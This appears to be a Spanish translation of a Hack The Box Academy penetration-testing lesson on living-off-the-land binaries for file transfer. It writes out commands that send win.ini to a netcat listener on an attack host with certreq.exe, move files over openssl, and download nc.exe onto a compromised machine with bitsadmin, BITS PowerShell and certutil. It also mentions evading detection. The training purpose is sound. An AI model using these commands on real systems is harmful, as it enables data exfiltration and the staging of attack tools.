# Viviendo fuera de la tierra

La frase "Vivir fuera de la tierra" fue acuñada por Christopher Campbell[@obscuresec](https://twitter.com/obscuresec)& Matt Graeber[@mattifestation](https://twitter.com/mattifestation)en[Derbycon 3](https://www.youtube.com/watch?v=j-r6UonEkUw).

El término Lolbins (que vive fuera de los binarios de la tierra) provino de una discusión de Twitter sobre cómo llamar binarios que un atacante puede usar para realizar acciones más allá de su propósito original. Actualmente hay dos sitios web que agregan información sobre la vida fuera de los binarios de la tierra:

- [Proyecto Lolbas para binarios de Windows](https://lolbas-project.github.io/)
- [Gtfobins para binarios de Linux](https://gtfobins.github.io/)

Vivir fuera de los binarios terrestres se puede utilizar para realizar funciones como:

- Descargar
- Subir
- Ejecución de comando
- Archivo Leer
- Archivo Escribir
- Derivaciones

Esta sección se centrará en usar proyectos LOLBAS y GTFOBINS y proporcionará ejemplos para las funciones de descarga y carga en los sistemas Windows y Linux.

---

# **Usando el proyecto lolbas y gtfobins**

[Lolbas para ventanas](https://lolbas-project.github.io/#)y[Gtfobins para Linux](https://gtfobins.github.io/)son sitios web donde podemos buscar binarios que podamos usar para diferentes funciones.

### **Lolbas**

Para buscar funciones de descarga y carga en[Lolbas](https://lolbas-project.github.io/)Podemos usar`/download`o`/upload`.

![](https://academy.hackthebox.com/storage/modules/24/lolbas_upload.jpg)

Usemos[Certreq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/)Como ejemplo.

Necesitamos escuchar en un puerto en nuestro host de ataque para el tráfico entrante usando NetCat y luego ejecutar CERTREQ.EXE para cargar un archivo.

### **Sube Win.ini a nuestro Pwnbox**

Viviendo fuera de la tierra

```
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)

```

Esto enviará el archivo a nuestra sesión de NetCat, y podemos copiar su contenido.

### **Archivo recibido en nuestra sesión de NetCat**

Viviendo fuera de la tierra

```
xnoxos@htb[/htb]$ sudo nc -lvnp 8000listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1

```

Si recibe un error al ejecutar`certreq.exe`, la versión que está utilizando puede no contener el`-Post`parámetro. Puede descargar una versión actualizada[aquí](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe)e inténtalo de nuevo.

### **Gtfobinas**

Para buscar la función de descarga y carga en[Gtfobins para binarios de Linux](https://gtfobins.github.io/), podemos usar`+file download`o`+file upload`.

![](https://academy.hackthebox.com/storage/modules/24/gtfobins_download.jpg)

Usemos[Openssl](https://www.openssl.org/). Con frecuencia se instala y a menudo se incluye en otras distribuciones de software, con sysadmins utilizándolo para generar certificados de seguridad, entre otras tareas. OpenSSL se puede usar para enviar archivos "estilo NC".

Necesitamos crear un certificado e iniciar un servidor en nuestro Pwnbox.

### **Crear certificado en nuestro Pwnbox**

Viviendo fuera de la tierra

```
xnoxos@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pemGenerating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

```

### **Poner el servidor en nuestro Pwnbox**

Viviendo fuera de la tierra

```
xnoxos@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

```

A continuación, con el servidor en ejecución, necesitamos descargar el archivo de la máquina comprometida.

### **Descargar archivo de la máquina comprometida**

Viviendo fuera de la tierra

```
xnoxos@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

---

# **Otros vivos comunes de las herramientas de tierras**

### **Función de descarga de bitsadmin**

El[Servicio de transferencia inteligente de antecedentes (bits)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)se puede usar para descargar archivos de sitios HTTP y acciones de SMB. "Inteligentemente" verifica la utilización del host y la red en cuenta para minimizar el impacto en el trabajo de primer plano de un usuario.

### **Descargar archivos con bitsadmin**

Viviendo fuera de la tierra

```powershell
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe

```

PowerShell también habilita la interacción con BIT, habilita las descargas y cargas de archivos, admite credenciales y puede usar servidores proxy especificados.

### **Descargar**

Viviendo fuera de la tierra

```powershell
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

```

---

### **Certutil**

Casey Smith ([@Subtee](https://twitter.com/subtee?lang=en)) encontraron que CertUtil se puede usar para descargar archivos arbitrarios. Está disponible en todas las versiones de Windows y ha sido una técnica popular de transferencia de archivos, que sirve como defactor`wget`para ventanas. Sin embargo, la interfaz antimalware de escaneo (AMSI) actualmente lo detecta como un uso de certutil malicioso.

### **Descargue un archivo con certutil**

Viviendo fuera de la tierra

```
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe

```

---

# **Práctica adicional**

Vale la pena leer los sitios web de Lolbas y Gtfobins y experimentar con tantos métodos de transferencia de archivos como sea posible. Cuanto más oscuro, mejor. Nunca se sabe cuándo necesitará uno de estos binarios durante una evaluación, y ahorrará tiempo si ya tiene notas detalladas sobre múltiples opciones. Algunos de los binarios que se pueden aprovechar para las transferencias de archivos pueden sorprenderlo.

En las dos secciones finales, tocemos las consideraciones de detección con respecto a las transferencias de archivos y algunos pasos podemos pasar para evadir la detección si el alcance de nuestra evaluación requiere pruebas evasivas.